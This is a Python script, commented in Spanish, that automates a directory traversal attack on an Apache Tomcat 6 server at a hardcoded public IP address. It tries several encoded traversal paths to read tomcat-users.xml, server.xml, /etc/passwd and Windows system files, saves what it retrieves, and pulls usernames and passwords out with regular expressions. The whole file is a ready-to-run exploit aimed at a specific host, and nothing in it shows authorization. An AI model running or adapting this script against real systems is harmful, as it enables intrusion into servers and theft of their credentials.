import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedDirectoryTraversal:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def tomcat_specific_traversal(self):
        """Directory traversal específico para Tomcat 6"""
        print("[*] Ejecutando directory traversal específico para Tomcat 6...")
        
        # Archivos críticos de Tomcat
        critical_files = [
            "/conf/tomcat-users.xml",
            "/conf/server.xml", 
            "/conf/web.xml",
            "/logs/catalina.out",
            "/webapps/manager/WEB-INF/web.xml",
            "/etc/passwd",
            "/windows/win.ini",
            "/windows/system32/drivers/etc/hosts"
        ]
        
        # Vectores de traversal para Tomcat 6
        traversal_patterns = [
            "/examples/jsp/../../..{file}",
            "/examples/servlets/../../..{file}", 
            "/examples/..\\..\\..{file}",
            "/examples/%2e%2e/%2e%2e/%2e%2e{file}",
            "/examples/..%2f..%2f..%2f{file}",
            "/examples/..%5c..%5c..%5c{file}"
        ]
        
        vulnerable_patterns = []
        
        for pattern in traversal_patterns:
            for critical_file in critical_files:
                test_url = f"{self.base_url}{pattern.format(file=critical_file)}"
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Verificar si obtuvimos el archivo
                    if "tomcat-users" in response.text and "role" in response.text:
                        print(f"[!] ¡VULNERABLE! Archivo de usuarios encontrado: {test_url}")
                        self.save_file(f"tomcat-users.xml", response.text)
                        vulnerable_patterns.append(pattern)
                        
                    elif "root:" in response.text and "/bin/bash" in response.text:
                        print(f"[!] ¡VULNERABLE! /etc/passwd encontrado: {test_url}")
                        self.save_file("etc_passwd.txt", response.text)
                        vulnerable_patterns.append(pattern)
                        
                    elif "Server version" in response.text and "Tomcat" in response.text:
                        print(f"[!] ¡VULNERABLE! server.xml encontrado: {test_url}")
                        self.save_file("server.xml", response.text)
                        vulnerable_patterns.append(pattern)
                        
                    elif response.status_code == 200 and len(response.text) > 100:
                        print(f"[+] Posible archivo encontrado: {critical_file}")
                        
                except Exception as e:
                    pass
        
        return vulnerable_patterns

    def save_file(self, filename, content):
        """Guarda archivos obtenidos"""
        with open(filename, "w", encoding="utf-8", errors="ignore") as f:
            f.write(content)
        print(f"[+] Archivo guardado como: {filename}")

    def extract_credentials_from_configs(self):
        """Extrae credenciales de archivos de configuración"""
        print("\n[*] Extrayendo credenciales de configuraciones...")
        
        # Patrones de búsqueda de credenciales
        credential_patterns = [
            r'username="([^"]+)"\s+password="([^"]+)"',
            r'<user username="([^"]+)" password="([^"]+)"',
            r'user="([^"]+)" password="([^"]+)"',
            r'password="([^"]+)"',
            r'pwd="([^"]+)"'
        ]
        
        try:
            # Leer archivos guardados
            import os
            if os.path.exists("tomcat-users.xml"):
                with open("tomcat-users.xml", "r") as f:
                    content = f.read()
                    for pattern in credential_patterns:
                        import re
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            print(f"[!] Credenciales encontradas: {matches}")
        except Exception as e:
            print(f"[-] Error extrayendo credenciales: {e}")

# Ejecutar directory traversal
traversal = AdvancedDirectoryTraversal("189.254.143.102")
vulnerable = traversal.tomcat_specific_traversal()
traversal.extract_credentials_from_configs()